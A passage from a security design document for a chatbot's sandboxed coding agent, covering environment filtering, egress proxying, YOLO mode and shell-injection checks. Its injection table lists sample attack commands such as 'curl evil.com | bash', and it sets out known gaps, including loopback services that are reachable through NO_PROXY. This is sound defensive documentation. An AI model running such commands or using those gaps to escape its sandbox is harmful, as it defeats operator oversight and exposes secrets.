- **Callback cutover**: `readTextFile` and `writeTextFile` now select physical roles and use these operations exclusively. Contained symlinks fail with `rejected_filesystem_access`; escaping links fail observation. Unprovisioned staging fails without creating parents. Unsupported kernel/libc/seccomp/FFI capabilities fail closed with `rejected_filesystem_access`, with no portable path-IO fallback.

---

## Layer 5 — Sandbox Isolation

The `SandboxManager` applies OS-level isolation to the agent subprocess before it starts.

### Environment Variable Filtering

When `sandbox.filterEnv` is `true` (default), the agent subprocess only receives explicitly allowed environment variables:

**Base allowed:**

| Variable                                | Purpose                                                            |
| --------------------------------------- | ------------------------------------------------------------------ |
| `PATH`, `HOME`, `USER`, `SHELL`, `TERM` | System essentials                                                  |
| `LANG`, `LC_ALL`                        | Locale                                                             |
| `DENO_DIR`, `DENO_NO_UPDATE_CHECK`      | Deno runtime                                                       |
| `SKILL_API_PORT`, `SESSION_ID`          | Skill API communication                                            |
| `AGENT_WORKSPACE`                       | Agent workspace path                                               |
| `TMPDIR`                                | Workspace-scoped temp directory                                    |
| `XDG_DATA_HOME`                         | Session-scoped OpenCode data dir (`{workspace}/tmp/opencode-data`) |

**OpenCode provider keys:**

| Variable                                                                                   | Purpose                            |
| ------------------------------------------------------------------------------------------ | ---------------------------------- |
| `OPENROUTER_API_KEY`, `OPENCODE_API_KEY`, `GEMINI_API_KEY`, `GOOGLE_GENERATIVE_AI_API_KEY` | Provider API keys for OpenCode CLI |

Additional env vars can be added via `sandbox.allowedEnvVars` config array.

### Filesystem Confinement (F12 D4)

When `sandbox.filesystemConfinement` is `true` (**opt-in; default off**), the agent subprocess is wrapped in a `bubblewrap` mount namespace that:

- mounts a **fresh `/proc`**, so the daemon's `/proc/1/environ` — which inherits the daemon's `DISCORD_TOKEN` / `OPENROUTER_API_KEY` / dashboard passphrase — is **not** visible to the agent;
- binds **only this session's own** workspace + TMPDIR (and, for self-research, the shared agent workspace) read-write; sibling users' workspaces are never bound, so they are absent from the namespace and unreadable;
- binds the runtime (interpreters, `opencode`/`agent-browser`, caches, CA certs) read-only. The shared home-rooted OpenCode data dir (`~/.local/share/opencode`) is **not bound at all** — the agent's data dir lives under its session-scoped `XDG_DATA_HOME` (inside the workspace), so the shared dir is never written or visible to the confined process.

This holds **independent of the permission layers** — a permissive or misconfigured `opencode.json` cannot re-expose the daemon environ or cross-user data, removing the single-point-of-failure property of the permission gate. It is **opt-in and runtime-dependent**: the fresh-`/proc` mount cannot be established inside a _doubly-nested_ user namespace (e.g. **rootless podman**, where `bwrap --proc` fails with "Can't mount proc … Permission denied" regardless of added capabilities), so it must be verified against the real deployment runtime with `scripts/probe-sandbox-caps.sh` before enabling. **When enabled but the runtime cannot establish the confinement, the daemon fails closed at startup** with an actionable error rather than running the agent unconfined. The authoritative permission gate (D1–D3 above) is the primary protection and is always on, independent of this defense-in-depth layer.

On **Kubernetes**, the full chain of requirements was established empirically (2026-07, Talos 1.7.2 / K8s 1.30 / containerd 1.7):

1. the node must allow unprivileged user namespaces (`user.max_user_namespaces > 0`; Talos defaults it to `0`);
2. the pod must not run under the default containerd seccomp profile, which gates `unshare`/`clone(CLONE_NEWUSER)` on `CAP_SYS_ADMIN` — an explicit `seccompProfile` (`Unconfined` or a custom `Localhost` profile that frees those syscalls) is required, which in turn needs the namespace's PodSecurity level relaxed from `baseline`;
3. even then, the CRI's **masked `/proc`** paths (`/proc/keys`, `/proc/acpi`, read-only `/proc/sys`, …) make the kernel refuse a fresh procfs mount in the new user namespace (the masking mounts are `MNT_LOCKED`). The Kubernetes remedy is `securityContext.procMount: Unmasked`, which since K8s 1.30 additionally **requires a user-namespaced pod** (`hostUsers: false`), which requires **containerd 2.0+** (or CRI-O ≥ 1.25) — kubelet rejects it on containerd 1.7 with `Failed to create pod sandbox: the handler "" is not known`.

In short: enabling this on Kubernetes needs a runtime shipping containerd 2.0+ plus `hostUsers: false`, `procMount: Unmasked`, a non-default seccomp profile, and a `privileged` PodSecurity level for the namespace. On clusters that cannot satisfy the chain, keep `filesystemConfinement: false` and rely on the always-on permission gate, env filtering, and egress mediation.

### Network Egress Mediation (F14)

The agent's `webfetch` / `websearch` / `agent-browser` use their own network stacks that never touch the daemon's `safeFetch` SSRF guard. The **default posture is `sandbox.egressProxy: true`**: the agent's egress is routed through a local **validating forward proxy** (`src/utils/egress-proxy.ts`) that reuses the `ssrf.ts` rule set — it allows public destinations but rejects loopback / RFC1918 / link-local / unique-local / cloud-metadata (`169.254.169.254`) / multicast targets, for both plain-HTTP and HTTPS (CONNECT) requests. The agent receives `HTTP_PROXY`/`HTTPS_PROXY` pointing at the proxy, with `NO_PROXY=localhost,127.0.0.1,::1` so its **loopback Skill API callbacks bypass the proxy** (the proxy would otherwise reject loopback as an internal target).

Egress posture is never silently open:

- `egressProxy: true` (default) → mediated egress; public research works, internal targets blocked.
- `networkIsolation: true` → **full** network-namespace isolation via `unshare --user --map-root --net` (userns-first; a bare `unshare --net` fails in a non-root container). NOTE: full isolation gives the agent an empty network namespace, which also **severs its loopback Skill API access** — use only when the agent needs no skill callbacks.
- `unrestrictedEgress: true` → explicit opt-in to raw, unmediated egress for trusted single-tenant deployments that accept the SSRF risk.
- none of the above configured → the daemon **fails closed** rather than granting open egress.

The validating proxy resolves each destination once, validates every resolved address, and connects to that **pinned** address (both CONNECT tunnels and plain-HTTP), so a DNS-rebinding second resolution cannot redirect the connection to an internal IP. The daemon-side `safeFetch` similarly pins the validated IP for plain-HTTP; HTTPS hostname pinning in `safeFetch` awaits a Deno connect-by-IP-with-SNI API (Open Question).

**Residual limitations of the default (env-proxy) posture — do not over-trust it.** Routing via `HTTP_PROXY`/`HTTPS_PROXY` is a best-effort convenience layer, **not** a hard boundary:

- A client that ignores the proxy env vars escapes mediation. OpenCode's `webfetch`/`websearch` and Chromium (`agent-browser`) honoring these vars is **unverified** and must be tested against the real binaries (point them at a private IP and confirm a 403).
- `NO_PROXY=localhost,127.0.0.1,::1` (needed so the loopback Skill API keeps working without a network bridge) means the agent can still reach **other loopback services on the daemon host** (e.g. `http://127.0.0.1:6379/`) directly, bypassing the proxy — the loopback carve-out is host-wide, not limited to the Skill API port.

Closing both gaps requires the authoritative network-route boundary (a namespace whose only egress is the proxy), which is deferred until the loopback Skill API is bridged into that namespace (UDS or a non-loopback bridge address). Until then, treat the default posture as blocking the trivial external-SSRF cases for proxy-honoring clients, not as a complete egress boundary. Operators who need a hard boundary today can use `networkIsolation: true` (full isolation; disables web tools and skill callbacks) for agents that need no egress.

**OMP URL reads get their own per-hop boundary on top of this posture.** The restricted OMP session's `read`-tool URL branch is served by the controlled fetch-transport adapter (`src/acp/omp/fetch-transport.ts` + the trusted-extension replacement), which re-validates **every hop before it is issued** — including redirect Locations and scraper-derived secondary URLs — with `redirect: "manual"` and the shared `ssrf.ts` rule set, so the env-proxy residual above no longer describes adapted URL reads (native auto-follow routes outside the replacement stay recorded as blocked). The posture semantics, the `HTTP_PROXY`-presence-is-not-enforcement honesty table, the DNS pinning carry-over, and the native-observation checklist live in [OMP_NETWORK.md](OMP_NETWORK.md).

**OMP web search and public code search ride the same decision core.** The restricted session's `web_search` replacement (`src/acp/omp/search-transport.ts`) delegates every provider/enrichment hop to that same per-hop core. Public **code/docs search** is the recorded capability gap: OpenCode removed its `codesearch` tool upstream before the packaging pin and pinned OMP offers no supported backend under the approved credential set, so the route stays blocked (`adapt-omp-public-code-search`; `src/acp/omp/code-search-transport.ts` + `code-search-routes.ts` pin the adapter contract, the reserved unconsumed completion, and the honest audit) — never a keyless-scraping backend, never a promoted `GITHUB_TOKEN`; the two user decision options (provision a separate read-only code-search credential via the approved config path, or accept the gap) are documented in [OMP_NETWORK.md](OMP_NETWORK.md). Public code/docs **content** remains reachable through the completed URL-read route above.

#### Operator-Trusted Egress Destinations (`egressAllowHosts`)

Deployments that legitimately need the agent to reach specific internal services (e.g. a LAN Stable Diffusion WebUI, an in-cluster reverse proxy) can enumerate them in `sandbox.egressAllowHosts` (env: `AGENT_SANDBOX_EGRESS_ALLOW_HOSTS`, comma-separated) instead of abandoning mediation with `unrestrictedEgress`:

- **Semantics**: each entry is a bare hostname or literal IP (no scheme, port, or path — malformed entries are warned about at startup and never match). Matching is **exact** (case-insensitive, IPv6 brackets stripped) against the requested destination host, for both CONNECT and plain-HTTP paths — one entry never widens into a range. DNS resolution and connect-time address pinning still apply to allowlisted hostnames.
- **Non-exemptable metadata block**: resolved addresses in the cloud-metadata space (`169.254.169.254`, `fd00:ec2::254`, etc.) are rejected **regardless of the allowlist** — a compromised DNS answer for an allowlisted name can never turn the trust grant into a credential-theft path.
- **NO_PROXY fast path**: allowlisted hosts are also appended to the agent's `NO_PROXY`/`no_proxy`, so env-honoring clients (e.g. `curl` in skill scripts) connect directly and avoid the proxy's forced single-request `Connection: close` semantics for large payloads. `NO_PROXY` matching varies by client; the proxy-side exemption remains authoritative for clients that ignore it, and both derive from the same config value.
- **Loopback all-ports warning**: entries carry no port scoping, so a loopback entry (`127.0.0.1`, `localhost`, `::1`) exposes **every** loopback port — the dashboard, the Skill API, and any future loopback-bound service — not just the one intended. Such entries are honored but logged at error level at startup.

The allowlist defaults to empty (posture identical to the above) and is sourced exclusively from operator deployment configuration — the agent and chat users cannot extend it at runtime.

**Reference**: `src/acp/sandbox-manager.ts`, `src/acp/filesystem-confinement.ts`, `src/acp/sandbox-capabilities.ts`, `src/utils/egress-proxy.ts`

---

## YOLO Mode

YOLO mode bypasses permission restrictions at multiple layers simultaneously:

| Layer                   | YOLO Behavior                                                                                  |
| ----------------------- | ---------------------------------------------------------------------------------------------- |
| Layer 1 (Agent Mode)    | OpenCode switches from the `build` agent to the `yolo` agent via ACP `setSessionMode("yolo")`. |
| Layer 2 (opencode.json) | The `yolo` agent's permissions are all `allow`.                                                |
| Layer 3 (ACP Client)    | `requestPermission()` auto-approves every request.                                             |
| Layer 4 (File Boundary) | Unchanged — path boundaries still enforced.                                                    |
| Layer 5 (Sandbox)       | Unchanged — env filtering and network isolation still apply.                                   |

### YOLO Resolution

YOLO can be enabled in two ways:

1. **Global CLI flag** (`--yolo`) — enables YOLO for all sessions. Set at application startup.
2. **Per-channel configuration** — enables YOLO for specific accounts/channels:

```yaml
channels:
  - id: "discord/account/123456789012345678"
    enabled: true
    yolo: true # YOLO for this account
```

The `getEffectiveYolo()` method resolves YOLO with priority:

1. Global `--yolo` flag → always wins
2. Per-channel `yolo: true` → checked via `ReplyPolicyEvaluator.resolveYoloDecision()`
3. Default → disabled

**Important**: Not all session types use `getEffectiveYolo()`. See [Per-Session-Type Permission Behavior](#per-session-type-permission-behavior) below.

**Reference**: `src/core/session-orchestrator.ts`, lines 102–135

---

## Per-Session-Type Permission Behavior

Different session types resolve YOLO differently based on whether they have a real platform/user/channel context:

| Session Type          | YOLO Resolution                                   | Reason                                                                          |
| --------------------- | ------------------------------------------------- | ------------------------------------------------------------------------------- |
| **message**           | `getEffectiveYolo(platform, userId, channelId)`   | Real user/channel context → per-channel config applies                          |
| **channelLurk**       | `getEffectiveYolo(platform, userId, channelId)`   | Real channel context → per-channel config applies                               |
| **spontaneous**       | `getEffectiveYolo(platform, botId, channelId)`    | Posts to real channels → per-channel config applies                             |
| **reminder**          | `getEffectiveYolo(platform, userId, dmChannelId)` | Real user DM context → per-channel config applies                               |
| **selfResearch**      | `this.yolo` (global flag only)                    | Internal session with synthetic identifiers — per-channel config is meaningless |
| **memoryMaintenance** | `this.yolo` (global flag only)                    | Internal session — same reasoning as selfResearch                               |

### Internal Sessions (selfResearch, memoryMaintenance)

These sessions use synthetic identifiers (e.g., platform=`"discord"`, userId=`"self-research"`, channelId=`"internal"`) that would never match any real channel configuration. Therefore, they bypass `getEffectiveYolo()` and use the global `--yolo` flag directly.

**Implication**: Per-channel YOLO overrides (`yolo: true` in channel config) have **no effect** on self-research or memory maintenance sessions. Only the global `--yolo` CLI flag controls their permission level.

**Reference**: `src/core/session-orchestrator.ts`

---

## How OpenCode Permissions Interact with the Layers

OpenCode uses Layer 2 (`opencode.json`) for most permissions, but delegates edit/write decisions to Layer 3 via `"ask"`. This is because OpenCode's edit/write tools convert file paths to relative paths before evaluating Layer 2 patterns, making absolute path patterns unreliable (see [Path Resolution in Permission Patterns](#path-resolution-in-permission-patterns)). The `build` agent enforces the restricted-mode whitelist; the `yolo` agent (selected via ACP `setSessionMode("yolo")`) grants all permissions.

| Aspect                          | Value                              |
| ------------------------------- | ---------------------------------- |
| **Binary**                      | `opencode`                         |
| **ACP invocation**              | `acp` (subcommand)                 |
| **Restricted agent** (non-YOLO) | `build` (`opencode.json`, Layer 2) |
| **YOLO switch**                 | ACP `setSessionMode("yolo")`       |
| **Config-based permissions**    | ✅ `opencode.json`                 |

**Reference**: `src/acp/agent-factory.ts`

---

## Skill Auto-Approve List

The skill auto-approve list determines which bash commands are automatically approved at Layer 3 in restricted mode. It contains two categories:

### Script-Based Skills

Skills with a `scripts/` directory containing `.ts` files. The auto-approve list stores **path suffixes** like `skills/memory-save/scripts/memory-save.ts`. During permission evaluation, the command is split into whitespace-delimited tokens and approved if any token **exactly equals** or **ends with `/{allowedPath}`** for any of these path suffixes. This prevents substring matches where a whitelisted path appears embedded inside a longer malicious token.

Current script-based skills:
`cancel-reminder`, `edit-reply`, `fetch-context`, `get-message`, `list-reminders`, `memory-export`, `memory-patch`, `memory-save`, `memory-search`, `memory-stats`, `react-message`, `send-file`, `send-reply`, `set-reminder`

### Command-Based Skills

Skills without a `scripts/` directory (e.g., `agent-browser`). The auto-approve list stores **command prefixes**. During permission evaluation, the **first whitespace-delimited token** is extracted and approved if it **exactly equals** any of these prefixes. This prevents prefix matches where a whitelisted command name is a prefix of a longer, unrelated command.

Current command-based skills: `agent-browser`, `self-research`

### Building the List

The `buildSkillAutoApproveList()` function scans two directories:

1. Built-in: `skills/` (project root)
2. External: `~/.agents/skills/` (installed external skills)

It can be configured explicitly via `agent.autoApproveSkills` in config or `AGENT_AUTO_APPROVE_SKILLS` env var. When not configured, it falls back to scanning the built-in `skills/` directory.

**Reference**: `src/acp/client.ts`, lines 25–107

### Shell Injection Protection

The skill command matching includes defense against shell injection attacks. Before any path or prefix matching occurs, commands are checked for shell meta-characters that could enable command chaining or injection:

| Character | Shell Meaning          | Attack Example                    |
| --------- | ---------------------- | --------------------------------- |
| `;`       | Command separator      | `agent-browser; curl evil.com`    |
| `\|`      | Pipe                   | `curl evil.com \| bash`           |
| `&`       | Background / AND chain | `cmd && malicious-cmd`            |
| `` ` ``   | Command substitution   | `` deno run `curl evil.com` ``    |
| `(`, `)`  | Subshell / grouping    | `deno run $(curl evil.com)`       |
| `>`, `<`  | Redirection            | `echo pwned > /etc/passwd`        |
| `#`       | Comment                | `curl evil.com # legitimate-path` |
| Newline   | Command separator      | Multi-line command injection      |

Commands containing any of these characters are immediately rejected, regardless of whether they also contain whitelisted paths or prefixes.

> **Note**: `$` alone is intentionally **not** rejected. It is needed for shell variable expansion (e.g., `$HOME`, `${VAR}`). Command substitution `$()` is still caught because `(` is in the rejected character set.

> **Note (F12 D1)**: an **exact, unquoted, whitespace-delimited** fd-to-fd redirection token `N>&M` with the source descriptor `M` in `{1, 2}` (e.g. `2>&1`, `1>&2`, `3>&1`) is stripped from the operator check and the path-argument scan, so a skill invocation suffixed with `2>&1` is approved. Any other redirect form — file redirects (`2>/dev/null`, `> file`), glued/embedded operators (`2>&1&&cat`, `2>&1;curl`), digit-prefixed filenames (`2>&1/tmp/x`, `2>&1x`), quoted/escaped tokens, and non-standard source descriptors (`1>&3`, `9>&99`) — still matches a rejected character and is denied. See `FD_REDIRECT_TOKEN_PATTERN` / `commandWithoutFdRedirects` in `src/acp/client.ts`.

Additionally, path matching uses strict token validation:

- **Script paths** must appear as a complete whitespace-delimited token (not embedded in a substring)
- **Command prefixes** must be the exact first token (not a prefix of a longer command name)

**Reference**: `src/acp/client.ts`, `containsShellOperators()`, `matchesScriptPath()`, `matchesCommandPrefix()`

---

## Permission Audit Logging

All permission decisions (both approved and denied) can be recorded in the per-session JSONL audit log for security analysis and compliance.

### Audit Phases

| Phase                 | Description                       |
| --------------------- | --------------------------------- |
| `permission_approved` | A permission request was approved |
| `permission_denied`   | A permission request was denied   |

### Audit Entry Data

Each permission audit entry includes:

| Field            | Type                     | Description                                                         |
| ---------------- | ------------------------ | ------------------------------------------------------------------- |
| `toolName`       | `string`                 | The tool or skill name that requested permission                    |
| `permissionKind` | `string`                 | The kind of permission requested (e.g., `execute`, `read`, `write`) |
| `command`        | `string?`                | The command content (hashed when `audit.hashContent` is `true`)     |
| `decision`       | `"approved" \| "denied"` | The permission decision outcome                                     |
| `reason`         | `string`                 | The reason for the decision                                         |

### Decision Reasons

| Reason                                             | Decision | Description                                                                                              |
| -------------------------------------------------- | -------- | -------------------------------------------------------------------------------------------------------- |
| `yolo_mode`                                        | approved | YOLO mode auto-approved the request                                                                      |
| `skills_directory_access`                          | approved | Read access to the skills directory                                                                      |
| `skill_whitelist`                                  | approved | Command matched the skill auto-approve list                                                              |
| `registered_skill`                                 | approved | Tool matched a registered skill name                                                                     |
| `rejected_write_path_outside_workspace`            | denied   | Physical target is outside writable roots or escapes through a link                                      |
| `rejected_agent_workspace_write_unauthorized`      | denied   | Restricted shared write lacks session authorization                                                      |
| `rejected_write_extension`                         | denied   | Restricted shared target extension is not allowed                                                        |
| `rejected_workspace_write_restricted`              | denied   | Ordinary restricted user-workspace mutation outside own staging                                          |
| `rejected_trusted_skills_read_only`                | denied   | Trusted skills write attempted in any mode                                                               |
| `rejected_trusted_skills_identity`                 | denied   | Trusted ownership/source/generation mismatch or writable overlap; stale callback observation             |
| `rejected_filesystem_context`                      | denied   | Missing/invalid registered ACP owner or context                                                          |
| `rejected_filesystem_path_unavailable`             | denied   | Expansion or canonical root/target observation failed                                                    |
| `rejected_filesystem_access`                       | denied   | Protected operation failed, including unavailable staging, symlinks, replacement or unsupported platform |
| `rejected_read_extension`                          | denied   | Workspace/shared/staging extension is outside `.jsonl`, `.md`, `.txt`                                    |
| `rejected_edit_write`                              | denied   | Edit/write operation rejected in restricted mode                                                         |
| `destructive_authorized`                           | approved | Complete ACP destructive input and every target authorized                                               |
| `rejected_destructive_incomplete`                  | denied   | Incomplete, unsupported, unparseable or title-only destructive intent                                    |
| `rejected_destructive_binding`                     | denied   | Bound decode or complete location set disagrees                                                          |
| `rejected_destructive_target`                      | denied   | Target denial fallback; existing filesystem reasons retain their meaning                                 |
| `rejected_unknown`                                 | denied   | Unknown tool rejected by default-deny policy                                                             |
| `rejected_generic_command_out_of_workspace`        | denied   | Generic command path argument resolved outside the allowed dirs                                          |
| `rejected_generic_command_shell_operator`          | denied   | Generic command contained a non-tolerated shell operator / file redirect                                 |
| `rejected_generic_command_first_token_not_allowed` | denied   | Generic command first token was not on the allow-list                                                    |
| `rejected_generic_command_dangerous_flag`          | denied   | Generic command used a code-exec / arbitrary-target flag (e.g. `find -exec`)                             |

### Content Hashing

When `audit.hashContent` is `true`, the `command` field is SHA-256 hashed and prefixed with `sha256:` to prevent sensitive command content from appearing in audit logs.

### Phase Filtering

Permission audit phases respect the `audit.includedPhases` configuration. When `includedPhases` is empty (default), all phases including permission phases are recorded. To selectively enable permission auditing, add `permission_approved` and/or `permission_denied` to the `includedPhases` list.

---

## Security Considerations

### What Each Layer Prevents

| Threat                                  | Prevented by                                                                                             |
| --------------------------------------- | -------------------------------------------------------------------------------------------------------- |
| Agent modifying source code             | Layer 2 (`"edit": "ask"` delegates to Layer 3), Layer 3 (edit/write scoped to agent workspace only)      |
| Agent running arbitrary commands        | Layer 2 (bash whitelist), Layer 3 (skill auto-approve list)                                              |
| Agent accessing other users' data       | Layer 4 (file access boundary — workspace isolation)                                                     |
| Agent exfiltrating secrets via env vars | Layer 5 (env var filtering)                                                                              |
| Agent making unauthorized network calls | Layer 5 (optional network isolation)                                                                     |
| Agent committing/pushing to git         | Layer 2 (`"git *": "deny"`), Layer 3 (not in skill list)                                                 |
| Agent writing non-allowed file types    | Layer 2 (`"edit": "ask"` delegates to Layer 3), Layer 3 (extension check), Layer 4 (writeTextFile check) |
| Permission bypass undetected            | All permission decisions (approved and denied) are recorded in per-session audit logs with full context  |

### Known Limitations

The P0 compatibility verdict in `docs/OMP_COMPATIBILITY.md` remains **BLOCKED**, with every `incompatible`/`unresolved` boundary unchanged. Under the user-approved fail-closed application ruling, this cutover ships client decisions without clearing native security consumption. Temporary-filesystem tests with injected native-call models certify client decisions and protected-operation wiring only. They do not certify native OMP delegation, deployment libc/seccomp, architecture images or bwrap. ACP SDK 0.14.1 filesystem callback methods and advertised `fs.readTextFile`/`fs.writeTextFile` capabilities are unchanged; the pinned OMP bridge's native fallback when capability is omitted is not exercised by these tests. The generic-command argument gate and `skills/lib/payload.ts` remain lexical, with their separate owners unchanged.

1. **OpenCode's Layer 2 is only as strong as opencode.json**: If the configuration file is modified, all Layer 2 protections are bypassed. YOLO mode is controlled via ACP `setSessionMode("yolo")`, which switches to the permissive `yolo` agent defined in `opencode.json`.

2. **Layer 3 relies on shell operator detection**: Layer 3 rejects commands containing shell meta-characters (`;`, `|`, `&`, `` ` ``, `(`, `)`, `>`, `<`, `#`, newlines) and validates script paths as complete whitespace-delimited tokens and command prefixes as exact first-token matches. `$` alone is intentionally allowed for variable expansion; `$()` is caught via `(`. A single narrow carve-out exists: an exact, unquoted, whitespace-delimited `N>&[12]` fd-to-fd redirection token (e.g. `2>&1`) is stripped before the operator check (see [Shell Injection Protection](#shell-injection-protection)). While this prevents known injection patterns (command chaining, piping, comment hiding), novel shell features or encoding tricks not covered by the character set could theoretically bypass the check.

3. **Self-research and memory maintenance always run in restricted mode**: There is no way to enable per-channel YOLO for these internal sessions — only the global `--yolo` flag works. This is by design (synthetic identifiers), but means trusted-channel YOLO configs don't apply to background tasks.

4. **OpenCode pattern matching limitations**: OpenCode's wildcard engine only expands `~` and `$HOME` — other environment variables (`$TMPDIR`, `$AGENT_WORKSPACE`, `${HOME}`) are not supported. All `opencode.json` permission patterns must use absolute paths or `~/`-relative paths. The TMPDIR pattern uses a broader absolute path (`/app/data/workspaces/*/tmp/**`) that covers all user workspaces; per-session isolation relies on Layers 3 and 4.

5. **OpenCode edit/write relative path resolution**: OpenCode's `edit`/`write` tools convert absolute file paths to relative paths (via `path.relative(Instance.worktree, filepath)`) before evaluating permission rules. This means file-path-based patterns in the `edit` permission section are unreliable — absolute paths will never match. The recommended approach is to set `"edit": "ask"` in `opencode.json` and rely on Layer 3 (`ChatbotClient.requestPermission()`) for edit/write permission enforcement. See [OpenCode edit.ts](https://github.com/anomalyco/opencode/blob/dev/packages/opencode/src/tool/edit.ts) and [OpenCode write.ts](https://github.com/anomalyco/opencode/blob/dev/packages/opencode/src/tool/write.ts).

---

## Configuration Reference

### Config File (`config.yaml`)

```yaml
agent:
  # Sandbox isolation for agent subprocess
  sandbox:
    filterEnv: true # Filter env vars to allowed list (default: true)
    networkIsolation: false # Linux network namespace isolation (default: false)
    allowedEnvVars: [] # Additional env var names to allow through
    allowedWriteExtensions: [
      ".md",
      ".txt",
    ] # Allowed file extensions for agent workspace writes in restricted mode

  # Skill auto-approve list (optional — falls back to scanning skills/ dir)
  autoApproveSkills:
    - "memory-save"
    - "memory-search"
    - "agent-browser"

# Per-channel YOLO
channels:
  - id: "discord/account/123456789012345678"
    enabled: true
    yolo: true

# Audit logging (includes permission audit phases)
audit:
  enabled: false
  retentionDays: 7
  hashContent: true
  includedPhases:
    - "skill_call"
    - "reply_sent"
    - "session_end"
    - "permission_approved"
    - "permission_denied"
```

### Environment Variables

| Variable                                 | Config Path                            | Description                                                          |
| ---------------------------------------- | -------------------------------------- | -------------------------------------------------------------------- |
| `AGENT_SANDBOX_FILTER_ENV`               | `agent.sandbox.filterEnv`              | `"true"` / `"false"`                                                 |
| `AGENT_SANDBOX_NETWORK_ISOLATION`        | `agent.sandbox.networkIsolation`       | `"true"` / `"false"`                                                 |
| `AGENT_SANDBOX_ALLOWED_ENV_VARS`         | `agent.sandbox.allowedEnvVars`         | Comma-separated list                                                 |
| `AGENT_SANDBOX_ALLOWED_WRITE_EXTENSIONS` | `agent.sandbox.allowedWriteExtensions` | Comma-separated list                                                 |
| `AGENT_AUTO_APPROVE_SKILLS`              | `agent.autoApproveSkills`              | Comma-separated list                                                 |
| `AGENT_OPENCODE_MIN_VERSION`             | — (observability only)                 | Minimum OpenCode version for the bootstrap check (default `1.17.13`) |

### Permission Rejection Feedback (Retry Prompt)

Every permission denial in `requestPermission()` and `writeTextFile()` is recorded in a bounded per-session ring buffer (max 10 entries; `commandOrPath` truncated to 200 chars). When an agent turn ends without a reply, reaction, or file send and the missing-reply retry fires, the retry prompt carries the recorded rejections as a `Recent permission rejections in this session:` section (bounded, truncated, framed as diagnostic data) so the Agent can self-correct.

- The buffer is **NOT** cleared by `reset()` — `reset()` runs at the start of every prompt (including the retry), so clearing there would wipe the data the retry prompt needs.
- It is cleared exactly once per logical session in `AgentConnector.createSession()`.
- The retry flow snapshots the records before the retry `connector.prompt()` call.

### OpenCode Version Compatibility

The ACP permission request shape changed in OpenCode v1.17.13 (PR #34079 "enrich permission prompts"): edit/write requests now carry `kind: "edit"` with `title` = the target file path (the ACP `ToolKind` vocabulary has no `"write"` kind). The permission gate accepts both the new shape and legacy title shapes.

- **Container pin**: `Containerfile` downloads a pinned `OPENCODE_VERSION` (default `1.17.13`) with per-arch SHA-256 checksum verification instead of `releases/latest`, so ACP contract changes cannot silently degrade the harness.
- **Bootstrap check**: `verifyOpenCodeVersion()` (`src/utils/opencode-version.ts`) runs at bootstrap, spawns `opencode --version` (5s timeout, no network, never starts an ACP session) and logs a structured, greppable marker: `OpenCode version check: OK|BELOW_MINIMUM|UNKNOWN`. Below-minimum or undeterminable versions only WARN — startup never blocks. This is an observability measure, NOT a functional gate.

### OpenCode Configuration

The `agent-config/opencode.json` file configures OpenCode agent permissions, defining both the restricted `build` agent and the permissive `yolo` agent. See [Layer 2](#layer-2--opencode-permission-configuration) for details.

---

## Canonical ACP Filesystem Roots Contract (OMP Integration Row 2 / P1a)

The `src/acp/filesystem-roots.ts` helper library provides an agent-generic, physically grounded root and target decision contract for ACP sessions.

### Key Architectural Invariants

1. **Operation-Neutral Observations**:
   - All functions in `src/acp/filesystem-roots.ts` return immutable observations (`CanonicalTarget`, `CanonicalSessionRoots`), **never** permission grants (`authorized: true`) or reusable capability tokens.
   - The helper performs zero protected file IO (no file reads/writes, no directory creation, no mutations).
   - Prechecks are advisory observations. They are **not race-proof** against subsequent file replacement or symlink retargeting during actual IO. Row 3 (`secure-acp-filesystem-access`) owns preserving containment across real operations.

2. **Contextual Token Expansion & Relative Anchoring**:
   - Supported tokens expand strictly against explicit `SessionContext`:
     - `$TMPDIR` / `${TMPDIR}` expands to `{sessionCwd}/tmp`.
     - `$SESSION_ID` / `${SESSION_ID}` expands to the active `skillSessionId`.
     - `$AGENT_WORKSPACE` / `${AGENT_WORKSPACE}` expands to `sharedWorkspacePath` if configured; fails with `unresolved_token` if absent.
   - Unknown tokens (e.g. `$TMPDIR2`, `$HOME`, `$OTHER`) or unbraced boundary collisions fail closed (`unresolved_token`).
   - Relative paths anchor strictly against `context.sessionCwd`, **never** the daemon process working directory `Deno.cwd()`.
   - Shell syntax, null bytes, device paths (`\\.\`, `/dev/`), and URI schemes (`http:`, `skill:`, `file:`) are rejected (`invalid_path`).
  - **Legacy compat only**: token-form staging paths (`$TMPDIR/$SESSION_ID/...`) are retained purely so older OpenCode callers whose prompts still name the tokens keep working — the expansion above resolves them to the same canonical staging root that current prompts now render as absolute literals. Prompts and `SKILL.md` docs no longer instruct the token form.

3. **Canonical Staging Identity vs Process State**:
   - Canonical staging is strictly `{canonical workspace}/tmp/{active Skill API ID}`.
   - A staging path linking to another session's staging, an ordinary workspace folder, or process temporary state fails with `invalid_root`.
   - For lazily missing staging or `tmp/`, prospective staging is anchored to the nearest existing canonical ancestor directory under the workspace, with missing components captured in `prospectiveMissingSuffix` (without calling `mkdir`).

4. **Trusted Read-Only Skills Root**:
   - Consumes deployment-owned root provenance and critical skill references from predecessor contract `establish-omp-compatibility-contracts`.
   - Must be strictly disjoint from all writable roots (fails `root_overlap`).
   - Role `trusted-skills` is explicitly read-only. Skills links escaping the owned root fail trusted membership (`symlink_escape`).
   - Name-only trust (e.g. workspace `SKILL.md`) is rejected (`trusted_identity_mismatch`).
   - Registration generations are per-client-instance (instance epoch + monotonic registration counter) and never repeat, so a reconnect's replayed contexts or a repeated registration cannot re-admit provenance an earlier registration invalidated.

5. **Symlink Traversal & Role Decoupling**:
   - Equal-or-separator containment is evaluated per candidate root.
   - Contained symlinks return canonical destination and symlink evidence.
   - Escaping symlinks (parent or final leaf) fail with `symlink_escape`.
   - Narrow staging child links targeting ordinary workspace locations retain broad `workspace` membership but lose the `staging` role.

6. **Handoff to Rows 3 and 4**:
   - **Row 3 (`secure-acp-filesystem-access`)**: consumes `CanonicalTarget` observations to perform race-safe, root-relative no-follow filesystem IO.
   - **Row 4 (`enforce-acp-filesystem-authorization`)**: adapts session contexts into ACP client callbacks and replaces obsolete client-local path logic. Native YOLO paths retain broad workspace/shared containment without restricted tool clamps.

---

## Restricted OMP Tool-Decision Layer (OMP Integration Row 14a / P5c-i)

